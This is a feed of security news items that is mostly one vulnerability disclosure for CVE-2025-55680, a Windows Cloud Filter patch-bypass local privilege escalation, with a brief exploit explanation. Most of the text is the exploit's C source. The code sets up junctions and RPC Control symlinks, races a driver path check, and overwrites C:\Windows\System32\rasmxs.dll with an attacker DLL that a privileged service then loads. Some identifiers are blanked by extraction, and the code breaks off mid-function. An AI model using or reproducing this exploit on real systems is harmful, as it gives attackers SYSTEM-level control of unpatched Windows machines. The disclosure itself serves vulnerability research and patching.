-Here are three practical steps every SOC can]]></content:encoded></item><item><title>New! Cloud Filter Arbitrary File Creation EoP Patch Bypass LPE - CVE-2025-55680</title><link>https://ssd-disclosure.com/cloud-filter-arbitrary-file-creation-eop-patch-bypass-lpe/</link><author>/u/SSDisclosure</author><category>netsec</category><pubDate>Wed, 5 Nov 2025 10:16:46 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Sharing is scaring: The WhatsApp screen-sharing scam you didn’t see coming</title><link>https://www.welivesecurity.com/en/scams/sharing-is-scaring-whatsapp-screen-sharing-scam/</link><author></author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 10:00:00 +0000</pubDate><source url="https://www.welivesecurity.com/">ESET WeLiveSecurity</source><content:encoded><![CDATA[How a fast-growing scam is tricking WhatsApp users into revealing their most sensitive financial and other data]]></content:encoded></item><item><title>Microsoft: October Windows updates trigger BitLocker recovery</title><link>https://www.bleepingcomputer.com/news/microsoft/microsoft-october-windows-updates-trigger-bitlocker-recovery/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Wed, 5 Nov 2025 08:56:22 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Microsoft has warned that some systems may boot into BitLocker recovery after installing the October 2025 Windows security updates. [...]]]></content:encoded></item><item><title>CISA Adds Gladinet and CWP Flaws to KEV Catalog Amid Active Exploitation Evidence</title><link>https://thehackernews.com/2025/11/cisa-adds-gladinet-and-cwp-flaws-to-kev.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgDITEgki_ICpEMcN92xGckaqijjlvW9kC6ZtYS8v1Fmvc50kvsku_Wke0Zk6nK6a27I8kbBHK8GSnlQ8xyGQx0_2WEMTfW4NN9Y5-ANCcPI5lTs7TdQwbaDygSw6KUqCaLW_JBEH1hKyvtVKjyqUs0Uk6xzrCIEW0nVuKt1VHtYv2SqCrHBJDznZQrP84J/s1600/CISA.jpg" length="" type=""/><pubDate>Wed, 5 Nov 2025 06:12:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Tuesday added two security flaws impacting Gladinet and Control Web Panel (CWP) to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation in the wild.
+Here are three practical steps every SOC can]]></content:encoded></item><item><title>New! Cloud Filter Arbitrary File Creation EoP Patch Bypass LPE - CVE-2025-55680</title><link>https://ssd-disclosure.com/cloud-filter-arbitrary-file-creation-eop-patch-bypass-lpe/</link><author>/u/SSDisclosure</author><category>netsec</category><pubDate>Wed, 5 Nov 2025 10:16:46 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[The vulnerability was disclosed during our TyphoonPWN Windows category and won first place.Vulnerability call chain:HsmFltProcessHSMControl->HsmFltProcessCreatePlaceholders->HsmpOpCreatePlaceholdersTo address this issue, Microsoft added the following code:while ( 1 )
+      {
+        v23 = *(_WORD *)((char *)v52 + 2 * v22 + epi16);
+        if ( v23 == '\\' || v23 == ':' )
+          break;
+        if ( ++v22 >= (unsigned __int16)(WORD1(v18) >> 1) )
+          goto LABEL_51;
+      }Which does not allow  or  in the path to prevent symbolic link attacks, but the path string is obtained using the following code:ProbeForRead(a4, Length, 4u);
+  MmProbeAndLockPages(MemoryDescriptorList, 1, IoReadAccess);
+  if ( (MemoryDescriptorList->MdlFlags & 5) != 0 )
+    MappedSystemVa = (char *)MemoryDescriptorList->MappedSystemVa;
+  else
+    MappedSystemVa = (char *)MmMapLockedPagesSpecifyCache(MemoryDescriptorList, 0, MmCached, 0i64, 0, 0x40000010u);
+  v46 = MappedSystemVa;This allows us to bypass the above check through toctou (time-of-check to time-of-use) and regain the arbitrary file write vulnerability.We then write  to c:/windows/system32/rasmxs.dll and make the privileged service load this malicious dll to gain privilege escalation..DoStartSvc();
+_mkdir("C:\\ProgramData\\cldpwn");
+_mkdir("C:\\ProgramData\\cldpwn\\boo");
+WCHAR* dir = (WCHAR*)L"C:\\ProgramData\\cldpwn";...
+HRESULT hr = CfRegisterSyncRoot(dir, &reg, &policies, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);init_symlink();Step 1 is the initialization step.First, start the  service and create two directories  and C:\ProgramData\cldpwn\boo. Then use  to set  as the root path.HANDLE dir_handle = CreateFileA("C:\\ProgramData\\cldpwn", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
+DWORD BytesReturned;
+char inbuffer[0x100] = { 0 };
+*(int*)inbuffer = 0x9000001A;
+*(int*)(inbuffer + 4) = 0xC0000007;
+char outbuffer[0x1000] = { 0 };
+DeviceIoControl(dir_handle, 0x903BC, inbuffer, 0x98, outbuffer, 0x1000, &BytesReturned, 0);Get the  through  and use it as a parameter to call int hResult = FilterConnectCommunicationPort(L"\\CLDMSGPORT",
+        0,
+        context,
+        16,
+        NULL,
+        &port);
+poc2(port);Here is actually the build parameter calling .wchar_t path[] = L"boo16.txt";
+
+createthread test = (createthread)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlCreateUserThread");
+HANDLE a;char buffer11[0x100];
+*(WORD*)(tmp + 0x8) = 0x100;
+*(WORD*)(tmp + 0xa) = (lstrlenW(path)) * 2;
+*(WORD*)(tmp + 0xc) = 0x20;
+*(WORD*)(tmp + 0xe) = 0x30;
+memcpy(tmp + 0x100, path, (lstrlenW(path) + 1) * 2);
+    ...
+*(int*)inbuffer = 0x9000001A;
+*(int*)(inbuffer + 4) = 0xC0000001;
+*(int*)(inbuffer + 8) = 0x1;
+*(int*)(inbuffer + 16) = 0x200;
+*(char**)(inbuffer + 24) = tmp;
+while (1) {
+
+        *(char*)(tmp + 0x106) = 0x31;
+        *(char*)(tmp + 0x11a) = 0x31;
+        DeviceIoControl(dir_handle, 0x903BC, inbuffer, 0x98, outbuffer, 0x1000, &BytesReturned, 0);
+    }Same as above,  actually corresponds to . This will always try to create the  file as a placeholdervoid thread1() {
+    while (1) {
+        Sleep(5);
+        *(char*)(tmp + 0x106) = 0x5c;
+
+    }
+}At the same time, we created  and tried to modify the memory continuously, changing the content of  to .The status when the vulnerability is triggered is as follows:The content of  passes the check and  is called with the content of .The code does not set  or , so any file creation is performed in KernelMode access mode, bypassing the access checkSince we previously symbolically linked  to c:/windows/system32/rasmxs.dll, this is actually equivalent to creating this file, and the user has read and write permissions for this file.Constantly check if the  file is created. If the file is detected, write the content of  to this file, and then use RPC to call  in the  service to load  to complete the exploit#pragma once
+#include <iostream>
+
+#include <windows.h>
+
+#include "d3dkmthk.h"
+
+#include <map>
+
+#include <iostream>
+
+#define ulong unsigned long
+#define ulonglong unsigned long long
+#define longlong long long
+#define ULONG unsigned long
+#define ULONGLONG unsigned long long
+#define ushort unsigned short
+#define USHORT unsigned short
+#define uchar unsigned char
+#define UCHAR unsigned char
+typedef struct _WNF_STATE_NAME {
+  ULONG Data[2];
+}
+WNF_STATE_NAME, * PWNF_STATE_NAME;
+typedef struct _REPARSE_DATA_BUFFER {
+  ULONG ReparseTag;
+  USHORT ReparseDataLength;
+  USHORT Reserved;
+  union {
+    struct {
+      USHORT SubstituteNameOffset;
+      USHORT SubstituteNameLength;
+      USHORT PrintNameOffset;
+      USHORT PrintNameLength;
+      ULONG Flags;
+      WCHAR PathBuffer[1];
+    }
+    SymbolicLinkReparseBuffer;
+    struct {
+      USHORT SubstituteNameOffset;
+      USHORT SubstituteNameLength;
+      USHORT PrintNameOffset;
+      USHORT PrintNameLength;
+      WCHAR PathBuffer[1];
+    }
+    MountPointReparseBuffer;
+    struct {
+      UCHAR DataBuffer[1];
+    }
+    GenericReparseBuffer;
+  }
+  DUMMYUNIONNAME;
+}
+REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;
+typedef enum _WNF_STATE_NAME_LIFETIME {
+  WnfWellKnownStateName,
+  WnfPermanentStateName,
+  WnfPersistentStateName,
+  WnfTemporaryStateName
+}
+WNF_STATE_NAME_LIFETIME;
+typedef enum _WNF_DATA_SCOPE {
+  WnfDataScopeSystem,
+  WnfDataScopeSession,
+  WnfDataScopeUser,
+  WnfDataScopeProcess,
+  WnfDataScopeMachine
+}
+WNF_DATA_SCOPE;
+typedef struct _WNF_TYPE_ID {
+  GUID TypeId;
+}
+WNF_TYPE_ID, * PWNF_TYPE_ID;
+typedef
+const WNF_TYPE_ID * PCWNF_TYPE_ID;
+typedef NTSTATUS(NTAPI * _NtCreateWnfStateName)(
+  _Out_ PWNF_STATE_NAME StateName,
+  _In_ WNF_STATE_NAME_LIFETIME NameLifetime,
+  _In_ WNF_DATA_SCOPE DataScope,
+  _In_ INT64 PersistData,
+  _In_opt_ INT64 TypeId,
+  _In_ INT64 MaximumStateSize,
+  _In_ PSECURITY_DESCRIPTOR SecurityDescriptor
+);
+typedef
+const WNF_STATE_NAME * PCWNF_STATE_NAME;
+typedef ULONG WNF_CHANGE_STAMP, * PWNF_CHANGE_STAMP;
+typedef NTSTATUS(NTAPI * _NtUpdateWnfStateData)(
+  _In_ PCWNF_STATE_NAME StateName,
+  _In_reads_bytes_opt_(Length) const VOID * Buffer,
+    _In_opt_ ULONG Length,
+    _In_opt_ PCWNF_TYPE_ID TypeId,
+    _In_opt_
+  const PVOID ExplicitScope,
+    _In_ WNF_CHANGE_STAMP MatchingChangeStamp,
+    _In_ INT64 CheckStamp
+);
+typedef NTSTATUS(NTAPI * _NtDeleteWnfStateData)(
+  _In_ PCWNF_STATE_NAME StateName,
+  _In_opt_
+  const PVOID ExplicitScope
+);
+typedef NTSTATUS(NTAPI * _NtQueryWnfStateData)(
+  _In_ PCWNF_STATE_NAME StateName,
+  _In_opt_ PCWNF_TYPE_ID TypeId,
+  _In_opt_
+  const VOID * ExplicitScope,
+    _Out_ PWNF_CHANGE_STAMP ChangeStamp,
+    _Out_writes_bytes_to_opt_( * BufferSize, * BufferSize) PVOID Buffer,
+    _Inout_ PULONG BufferSize
+);
+
+typedef NTSTATUS(NTAPI * _NtFsControlFile)(
+  IN HANDLE FileHandle,
+  IN HANDLE Event OPTIONAL,
+  IN void * ApcRoutine OPTIONAL,
+  IN PVOID ApcContext OPTIONAL,
+  OUT void * IoStatusBlock,
+  IN INT64 FsControlCode,
+  IN PVOID InputBuffer OPTIONAL,
+  IN INT64 InputBufferLength,
+  OUT PVOID OutputBuffer OPTIONAL,
+  IN INT64 OutputBufferLength
+);
+
+_NtQueryWnfStateData NtQueryWnfStateData;
+_NtDeleteWnfStateData NtDeleteWnfStateData;
+
+_NtCreateWnfStateName NtCreateWnfStateName;
+_NtUpdateWnfStateData NtUpdateWnfStateData;
+_NtFsControlFile NtFsControlFile;
+WNF_STATE_NAME array[0x1000] = {
+  0
+};
+
+typedef NTSTATUS(NTAPI * _NtQuerySystemInformation)(
+  int InfoClass, void * OutputBuffer, ULONG OutputBufferLength, ULONG * pReturnedLength
+);
+typedef struct _OBJECT_TYPE_INFORMATION {
+  UNICODE_STRING TypeName;
+  ULONG TotalNumberOfObjects;
+  ULONG TotalNumberOfHandles;
+  ULONG TotalPagedPoolUsage;
+  ULONG TotalNonPagedPoolUsage;
+  ULONG TotalNamePoolUsage;
+  ULONG TotalHandleTableUsage;
+  ULONG HighWaterNumberOfObjects;
+  ULONG HighWaterNumberOfHandles;
+  ULONG HighWaterPagedPoolUsage;
+  ULONG HighWaterNonPagedPoolUsage;
+  ULONG HighWaterNamePoolUsage;
+  ULONG HighWaterHandleTableUsage;
+  ULONG InvalidAttributes;
+  GENERIC_MAPPING GenericMapping;
+  ULONG ValidAccessMask;
+  BOOLEAN SecurityRequired;
+  BOOLEAN MaintainHandleCount;
+  BOOLEAN TypeIndex;
+  CHAR ReservedByte;
+  ULONG PoolType;
+  ULONG DefaultPagedPoolCharge;
+  ULONG DefaultNonPagedPoolCharge;
+}
+OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;
+typedef enum _OBJECT_INFORMATION_CLASS {
+  ObjectBasicInformation = 0,
+    ObjectTypeInformation = 2
+}
+OBJECT_INFORMATION_CLASS;
+
+typedef NTSTATUS(NTAPI * _NtQueryObject)(
+  HANDLE Handle,
+  OBJECT_INFORMATION_CLASS ObjectInformationClass,
+  PVOID ObjectInformation,
+  ULONG ObjectInformationLength,
+  PULONG ReturnLength
+);
+
+_NtQuerySystemInformation NtQuerySystemInformation;
+_NtQueryObject NtQueryObject;
+struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
+  USHORT UniqueProcessId; //at 0x0
+  USHORT CreatorBackTraceIndex; //at 0x2
+  UCHAR ObjectTypeIndex; //at 0x4
+  UCHAR HandleAttributes; //at 0x5
+  USHORT HandleValue; //at 0x6
+  PVOID Object; //at 0x8
+  ULONG GrantedAccess; //at 0x10
+  ULONG Pad; //at 0x14
+};
+
+typedef struct _SYSTEM_HANDLE_INFORMATION {
+  /* 0x0000 */
+  unsigned long NumberOfHandles;
+  /* 0x0008 */
+  struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
+}
+SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION; /* size: 0x0020 */
+char cmd[0x100] = {
+  0
+};
+
+#define SystemProcessInformation 0x5
+#define SystemLocksInformation 0xC
+#define SystemHandleInformation 0x10
+#define SystemObjectInformation 0x11
+#define SystemModuleInformation 0xB
+#define SystemLoadedModuleInformation 0xB
+#define SystemModuleInformationEx 0x4D
+#define SystemSessionProcessInformation 0x35
+#define SystemExtendedProcessInformation 0x39
+#define SystemExtendedHandleInformation 0x40
+#define SystemBigPoolInformation 0x42
+#define SystemSessionBigPoolInformation 0x7D
+#define SystemMemoryListInformation 80
+#define FAKE_EPROCESS_SIZE 0x640
+#define FAKE_EPROCESS_OFFSET 0x50
+#define ProcessHandleTracing 0x20
+#define ProcessWorkingSetWatch 0xF
+#define ProcessWorkingSetWatchEx 0x2A
+#define STATUS_UNSUCCESSFUL 0xC0000001
+#define STATUS_NOT_IMPLEMENTED 0xC0000002
+#define STATUS_INVALID_INFO_CLASS 0xC0000003
+#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
+
+struct _SYSTEM_MODULE {
+  ulonglong Pad0; //at 0x0
+  ulonglong Pad1; //at 0x8
+  void * ImageBase; //at 0x10
+  ulong SizeOfImage; //at 0x18
+  ulong Flags; //at 0x1C
+  ushort Index; //at 0x20
+  ushort bUserMode; //at 0x22,0 kernelmodule,sameas Index user
+  ushort LoadCount; //at 0x24
+  ushort BaseNameOffset; //at 0x26
+  unsigned char FullDllName[0x100]; //at 0x28
+};
+
+struct _SYSTEM_MODULE_LIST {
+  ulong NumberOfModules;
+  ulong Pad;
+  _SYSTEM_MODULE Module[1];
+};// filter_.cpp
+//
+#include <stdio.h>
+#include <direct.h>
+#include <stdlib.h>
+#include<windows.h>
+#include<string.h>
+#include<wchar.h>
+#include <ntsecapi.h>
+#include<time.h>
+#include<stdlib.h>
+#include<malloc.h>
+#include <clfsw32.h>
+#include <fltUser.h>
+#include <string>
+#include <cfapi.h>
+#include "Header.h"
+
+SC_HANDLE schSCManager;
+SC_HANDLE schService;
+
+void * user_space;
+char * tmp;
+INT64 event_addr, event_addr1 = 0;
+HANDLE eventa, eventb = 0;
+typedef ULONG(NTAPI * createthread)(
+  IN HANDLE ProcessHandle,
+  IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
+  IN BOOLEAN CreateSuspended,
+  IN ULONG StackZeroBits,
+  IN OUT PULONG StackReserved,
+  IN OUT PULONG StackCommit,
+  IN PVOID StartAddress,
+  IN PVOID StartParameter OPTIONAL,
+  OUT PHANDLE ThreadHandle,
+  OUT PDWORD ClientID);
+
+HANDLE port, port1, dev;
+INT64 fileid, stream_key;
+#define FIELD_SIZE(type, field)(sizeof(((type * ) 0) -> field))
+#define CF_SIZE_OF_OP_PARAM(field)(FIELD_OFFSET(CF_OPERATION_PARAMETERS, field) + FIELD_SIZE(CF_OPERATION_PARAMETERS, field))
+
+VOID __stdcall DoStartSvc() {
+  wchar_t szSvcName[] = L "rasman";
+  SERVICE_STATUS_PROCESS ssStatus;
+  DWORD dwOldCheckPoint;
+  DWORD dwStartTickCount;
+  DWORD dwWaitTime;
+  DWORD dwBytesNeeded;
+
+  // Get a handle to the SCM database. 
+
+  schSCManager = OpenSCManager(
+    NULL, // local computer
+    NULL, // servicesActive database 
+    SERVICE_START | SERVICE_QUERY_STATUS); // full access rights 
+
+  if (NULL == schSCManager) {
+    printf("OpenSCManager failed (%d)\n", GetLastError());
+    return;
+  }
+
+  // Get a handle to the service.
+
+  schService = OpenService(
+    schSCManager, // SCM database 
+    szSvcName, // name of service 
+    SERVICE_START | SERVICE_QUERY_STATUS); // full access 
+
+  if (schService == NULL) {
+    printf("OpenService failed (%d)\n", GetLastError());
+    CloseServiceHandle(schSCManager);
+    return;
+  }
+
+  // Check if the service is already running. It would be possible 
+  // to stop the service here, but for simplicity this example just returns. 
+
+  // Save the tick count and initial checkpoint.
+
+  // Attempt to start the service.
+
+  if (!StartService(
+      schService, // handle to service 
+      0, // number of arguments 
+      NULL)) // no arguments 
+  {
+    printf("StartService failed (%d)\n", GetLastError());
+
+  }
+  if (!QueryServiceStatusEx(
+      schService, // handle to service 
+      SC_STATUS_PROCESS_INFO, // info level
+      (LPBYTE) & ssStatus, // address of structure
+      sizeof(SERVICE_STATUS_PROCESS), // size of structure
+      &
+      dwBytesNeeded)) // if buffer too small
+  {
+    printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
+    CloseServiceHandle(schService);
+    CloseServiceHandle(schSCManager);
+    return;
+  }
+
+  // Save the tick count and initial checkpoint.
+
+  dwStartTickCount = GetTickCount();
+  dwOldCheckPoint = ssStatus.dwCheckPoint;
+
+  while (ssStatus.dwCurrentState == SERVICE_START_PENDING) {
+    // Do not wait longer than the wait hint. A good interval is 
+    // one-tenth the wait hint, but no less than 1 second and no 
+    // more than 10 seconds. 
+
+    dwWaitTime = ssStatus.dwWaitHint / 10;
+
+    if (dwWaitTime < 1000)
+      dwWaitTime = 1000;
+    else if (dwWaitTime > 10000)
+      dwWaitTime = 10000;
+
+    Sleep(dwWaitTime);
+
+    // Check the status again. 
+
+    if (!QueryServiceStatusEx(
+        schService, // handle to service 
+        SC_STATUS_PROCESS_INFO, // info level
+        (LPBYTE) & ssStatus, // address of structure
+        sizeof(SERVICE_STATUS_PROCESS), // size of structure
+        &
+        dwBytesNeeded)) // if buffer too small
+    {
+      printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
+      break;
+    }
+
+    if (ssStatus.dwCheckPoint > dwOldCheckPoint) {
+      // Continue to wait and check.
+
+      dwStartTickCount = GetTickCount();
+      dwOldCheckPoint = ssStatus.dwCheckPoint;
+    } else {
+      if (GetTickCount() - dwStartTickCount > ssStatus.dwWaitHint) {
+        // No progress made within/ the wait hint.
+        break;
+      }
+    }
+  }
+
+  // Determine whether the service is running.
+
+  if (ssStatus.dwCurrentState == SERVICE_RUNNING) {
+    printf("Service started successfully.\n");
+  }
+  CloseServiceHandle(schService);
+  CloseServiceHandle(schSCManager);
+}
+
+VOID ACK_RENAME(CF_CALLBACK_INFO * info, _In_ CONST CF_CALLBACK_PARAMETERS * CallbackParameters) {
+
+  CF_OPERATION_INFO op_info = {
+    0
+  };
+  CF_OPERATION_PARAMETERS op_params = {
+    0
+  };
+  op_info.StructSize = sizeof(op_info);
+  op_info.Type = CF_OPERATION_TYPE_ACK_RENAME;
+  op_info.ConnectionKey = info -> ConnectionKey;
+  op_info.TransferKey = info -> TransferKey;
+  op_info.RequestKey = info -> RequestKey;
+  op_params.ParamSize = CF_SIZE_OF_OP_PARAM(CF_OPERATION_PARAMETERS::AckRename);
+  op_params.AckRename.CompletionStatus = 0;
+
+  printf("callback!\n");
+  CfExecute( & op_info, & op_params);
+}
+
+void poc2(HANDLE port1) {
+
+  char buffer[0x200];
+  DWORD * buffer1 = (DWORD * ) buffer;
+  memset(buffer, 0, 0x200);
+  char out[0x200] = {
+    0
+  };
+  DWORD re;
+
+  *(DWORD * )(buffer) = 0x706D6C43;
+  *(DWORD * )(buffer + 8) = 0x200;
+  *(byte * )(buffer + 12) = 0;
+  *(WORD * )(buffer + 14) = 0x17;
+  *(WORD * )(buffer + 16) = 0x7;
+  *(WORD * )(buffer + 18) = 0x1;
+  *(WORD * )(buffer + 20) = 0x100;
+
+  *(WORD * )(buffer + 24) = 0x8;
+  *(WORD * )(buffer + 26) = 0x2;
+  *(WORD * )(buffer + 28) = 0x1f0;
+  *(WORD * )(buffer + 0x1f0) = 0x4;
+  *(WORD * )(buffer + 32) = 11;
+  *(WORD * )(buffer + 34) = 8;
+  *(WORD * )(buffer + 36) = 0x1e0;
+  *(DWORD * )(buffer + 0x1e0) = (DWORD) dev;
+  *(WORD * )(buffer + 0x30) = 6;
+  *(WORD * )(buffer + 0x32) = 8;
+  *(WORD * )(buffer + 0x34) = 0x1e0;
+
+  *(WORD * )(buffer + 0x38) = 10;
+  *(WORD * )(buffer + 0x3a) = 4;
+  *(WORD * )(buffer + 0x3c) = 0x1e8;
+  *(INT * )(buffer + 0x1e8) = 0;
+
+  *(WORD * )(buffer + 0x78) = 10;
+  *(WORD * )(buffer + 0x7a) = 4;
+  *(WORD * )(buffer + 0x7c) = 0x1c0;
+  *(INT * )(buffer + 0x1c0) = 0x40;
+
+  *(WORD * )(buffer + 0x80) = 10;
+  *(WORD * )(buffer + 0x82) = 4;
+  *(WORD * )(buffer + 0x84) = 0x1ec;
+  *(INT * )(buffer + 0x1ec) = 0;
+
+  *(WORD * )(buffer + 0xc0) = 6;
+  *(WORD * )(buffer + 0xc2) = 8;
+  *(WORD * )(buffer + 0xc4) = 0x1d0;
+  *(INT64 * )(buffer + 0x1d0) = fileid;
+
+  FilterSendMessage(port1, buffer, 0x200, out, 0x200, & re);
+}
+
+struct param {
+  char name[32];
+  int64_t type;
+  int offset;
+  int len;
+  int64_t ptr;
+};
+
+int offset = 0x1805c; //0x18cf8
+typedef ULONG(NTAPI * submit_request)
+  (void * a1, int64_t a2);
+
+void trigger_loadlibrary(int index) {
+  DWORD buf[0x800];
+  memset(buf, 0, 0x800);
+  buf[0] = index;
+  buf[1] = 0xe; //function code RasSetTriggerAuthData
+  buf[2] = 8;
+  memcpy( & buf[8], "SWITCH", 7);
+  memcpy( & buf[12], "WAN Miniport (IKEv2)", 0x20);
+  buf[46] = 1;
+  param * tmp = (param * ) & buf[48];
+  memcpy(tmp -> name, "PhoneNumber", 16);
+  tmp -> type = 1;
+  tmp -> offset = 0x10;
+  tmp -> ptr = 0x38;
+  memcpy( & buf[62], "192.168.200.1", 16);
+  char * a = (char * ) LoadLibraryA("rasman.dll");
+  submit_request z = (submit_request)(a + offset);
+  //z(1,0x200,buf);
+
+  z(buf, 0x1cab);
+
+}
+
+void thread1() {
+  wchar_t path[] = L "boo\\starpoint\\3.txt";
+  while (1) {
+    Sleep(5);
+    *(char * )(tmp + 0x106) = 0x5c;
+
+  }
+}
+
+void thread2() {
+  char buf[] = "pwned!";
+  HANDLE hSourceFile;
+  hSourceFile = CreateFileA("test.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+  if (hSourceFile == INVALID_HANDLE_VALUE) {
+    printf("open test.dll fail\n");
+    exit(0);
+  }
+  char buffer[1024] = {
+    0
+  };
+  DWORD bytesRead;
+  DWORD size;
+  while (1) {
+    Sleep(1000);
+    HANDLE handle = CreateFile((LPCWSTR) L "C:\\Windows\\System32\\rasmxs.dll", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_UNPINNED, NULL); // must be FILE_ATTRIBUTE_UNPINNED
+
+    if ((INT) handle > 0) {
+      while (ReadFile(hSourceFile, buffer, sizeof(buffer), & bytesRead, NULL) && bytesRead > 0) {
+        WriteFile(handle, buffer, bytesRead, NULL, NULL);
+      }
+
+      CloseHandle(handle);
+
+      trigger_loadlibrary(1);
+      exit(0);
+    }
+  }
+
+}
+
+BOOL CreateJunction(LPCWSTR dir, LPCWSTR target) {
+  HANDLE hJunction;
+  DWORD cb;
+  wchar_t printname[] = L "";
+  HANDLE hDir;
+  hDir = CreateFile(dir, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
+
+  if (hDir == INVALID_HANDLE_VALUE) {
+    printf("[!] Failed to obtain handle on directory %ls.\n", dir);
+    return FALSE;
+  }
+
+  SIZE_T TargetLen = wcslen(target) * sizeof(WCHAR);
+  SIZE_T PrintnameLen = wcslen(printname) * sizeof(WCHAR);
+  SIZE_T PathLen = TargetLen + PrintnameLen + 12;
+  SIZE_T Totalsize = PathLen + (DWORD)(FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer));
+  PREPARSE_DATA_BUFFER Data = (PREPARSE_DATA_BUFFER) malloc(Totalsize);
+  Data -> ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
+  Data -> ReparseDataLength = PathLen;
+  Data -> Reserved = 0;
+  Data -> MountPointReparseBuffer.SubstituteNameOffset = 0;
+  Data -> MountPointReparseBuffer.SubstituteNameLength = TargetLen;
+  memcpy(Data -> MountPointReparseBuffer.PathBuffer, target, TargetLen + 2);
+  Data -> MountPointReparseBuffer.PrintNameOffset = (USHORT)(TargetLen + 2);
+  Data -> MountPointReparseBuffer.PrintNameLength = (USHORT) PrintnameLen;
+  memcpy(Data -> MountPointReparseBuffer.PathBuffer + wcslen(target) + 1, printname, PrintnameLen + 2);
+
+  if (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, NULL, 0, & cb, NULL) != 0) {
+    printf("[+] Junction %ls -> %ls created!\n", dir, target);
+    free(Data);
+    return TRUE;
+
+  } else {
+    printf("[!] Error on creating junction %ls -> %ls : Error code %d\n", dir, target, GetLastError());
+    free(Data);
+    return FALSE;
+  }
+}
+
+BOOL DeleteJunction(LPCWSTR dir) {
+
+  HANDLE hJunction;
+  DWORD cb;
+  wchar_t printname[] = L "";
+  HANDLE hDir;
+  hDir = CreateFile(dir, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
+
+  if (hDir == INVALID_HANDLE_VALUE) {
+    printf("[!] Failed to obtain handle on directory %ls.\n", dir);
+    return FALSE;
+  }
+  REPARSE_GUID_DATA_BUFFER buffer = {
+    0
+  };
+  BOOL ret;
+  buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
+
+  if (DeviceIoControl(hDir, FSCTL_DELETE_REPARSE_POINT, & buffer, REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, NULL, NULL, & cb, NULL)) {
+
+    printf("[+] Junction %ls deleted!\n", dir);
+    return TRUE;
+  } else {
+    printf("[!] Error: %d.\n", GetLastError());
+    return FALSE;
+  }
+}
+
+BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
+  if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, object, target)) {
+    printf("[+] Symlink %ls -> %ls created!\n", object, target);
+    return TRUE;
+
+  } else {
+    printf("[!] Error in creating Symlink : %d\n", GetLastError());
+    return FALSE;
+  }
+}
+
+BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
+  if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH | DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE, object, target)) {
+    printf("[+] Symlink %ls -> %ls deleted!\n", object, target);
+    return TRUE;
+  } else {
+    printf("[!] Error in deleting Symlink : %d\n", GetLastError());
+    return FALSE;
+  }
+}
+void init_symlink() {
+  if (!CreateJunction(L "C:\\ProgramData\\cldpwn\\boo\\", L "\\RPC Control")) {
+    printf("[!] Failed to create junction! Exiting!\n");
+    exit(1);
+  }
+  if (!DosDeviceSymLink(L "GLOBAL\\GLOBALROOT\\RPC Control\\6.txt", L "\\??\\C:\\Windows\\System32\\rasmxs.dll")) {
+    printf("[!] Failed to create symlink! Exiting!\n");
+    exit(1);
+  }
+}
+
+void clear_symlink() {
+  DeleteJunction(L "C:\\ProgramData\\cldpwn\\boo\\starpoint\\");
+  DelDosDeviceSymLink(L "GLOBAL\\GLOBALROOT\\RPC Control\\6.txt", L "\\??\\C:\\Windows\\System32\\rasmxs.dll");
+}
+
+int main() {
+
+  DoStartSvc();
+  _mkdir("C:\\ProgramData\\cldpwn");
+  _mkdir("C:\\ProgramData\\cldpwn\\boo");
+
+  init_symlink();
+  tmp = (char * ) malloc(0x200);
+  memset(tmp, 0, 0x200);
+  //_rmdir("C:\\ProgramData\\cldpwn");
+
+  WCHAR * dir = (WCHAR * ) L "C:\\ProgramData\\cldpwn";
+  GUID guid = {
+    0
+  };
+  guid.Data1 = 0xB196E670;
+  guid.Data2 = 0x59C7;
+  guid.Data3 = 0x4D42;
+  CF_SYNC_REGISTRATION reg = {
+    0
+  };
+  reg.StructSize = sizeof(reg);
+  reg.ProviderName = L "test";
+  reg.ProviderVersion = L "1.0";
+  reg.ProviderId = guid;
+  CF_SYNC_POLICIES policies = {
+    0
+  };
+  policies.StructSize = sizeof(policies);
+  policies.HardLink = CF_HARDLINK_POLICY_ALLOWED;
